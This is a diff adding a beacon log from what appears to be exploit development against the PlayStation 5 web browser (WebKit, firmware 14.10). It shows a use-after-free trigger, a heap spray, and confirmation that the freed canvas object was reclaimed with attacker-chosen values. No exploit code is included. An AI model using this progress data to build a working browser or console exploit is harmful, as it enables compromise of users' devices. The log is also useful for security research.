@@ -1,0 +1,50 @@
+P550 — On-Device Beacon Log
+======================================================
+Target:   PS5 14.10 (AppleWebKit/605.1.15, Version/17.0)
+Date:     2026-10-26
+Source:   host-beacons.log (host.py JSON-lines capture)
+Beacons:  18 total
+
+=== BEACON SEQUENCE ===
+
+[05:35:09] START: ua=Mozilla/5.0 (PlayStation; PlayStation 5/14.10) AppleWebKit/6
+[05:35:09] TRIGGER: getter=0 inner=false outer=true same=false curOuter=true curInner=false
+[05:35:09] ABORT: inner is null
+[05:35:09] ALIVE: probe completed
+[05:50:48] START: ua=Mozilla/5.0 (PlayStation; PlayStation 5/14.10) AppleWebKit/6
+[05:50:48] TRIGGER: getter=1 inner=true
+[05:50:48] UAF: stale wrapper captured
+[05:50:48] SPRAYED: n=300
+[05:50:48] MATRIX: a=11.110011 b=22.220022 c=33.330033 d=44.440044 e=55.550055 f=66.660066
+[05:50:48] MATRIX-HEX: a=0x402638535c9e6688 b=0x403638535c9e6688 c=0x4040aa3e8576cce6 d=0x404638535c9e6688 e=0x404bc66833c6002a f=0x4050aa3e8576cce6
+[05:50:48] TRANSFORM-HIT: sentinel matched — same-type reclaim confirmed
+[05:50:48] LINEDASH: len=6 vals=[77.77(0x40537147ae147ae1), 88.88(0x40563851eb851eb8), 99.99(0x4058ff5c28f5c28f), 77.77(0x40537147ae147ae1), 88.88(0x40563851eb851eb8), 99.99(0x4058ff5c28f5c28f)]
+[05:50:48] LINEDASH-OTHER: match=false
+[05:50:48] PROPS: lineWidth=123.456(0x405edd2f1a9fbe77) miterLimit=789.012(0x4088a8189374bc6a) globalAlpha=0.31337(0x3fd40e410b630a91) shadowOffsetX=0(0x0000000000000000) shadowBlur=0(0x0000000000000000) lineDashOffset=0(0x0000000000000000)
+[05:50:48] PROPS-MATCH: lw=true ml=true ga=true
+[05:50:49] MEASURE: width=50(0x4049000000000000)
+[05:50:49] CANVAS-REF: type=object is=[object HTMLCanvasElement]
+[05:50:49] ALIVE: probe completed
+
+=== SUMMARY ===
+
+First beacon: 2026-10-26T05:35:09.368
+Last beacon:  2026-10-26T05:50:49.104
+Total beacons: 18
+
+Event counts:
+  ABORT: 1
+  ALIVE: 2
+  CANVAS-REF: 1
+  LINEDASH: 1
+  LINEDASH-OTHER: 1
+  MATRIX: 1
+  MATRIX-HEX: 1
+  MEASURE: 1
+  PROPS: 1
+  PROPS-MATCH: 1
+  SPRAYED: 1
+  START: 2
+  TRANSFORM-HIT: 1
+  TRIGGER: 2
+  UAF: 1
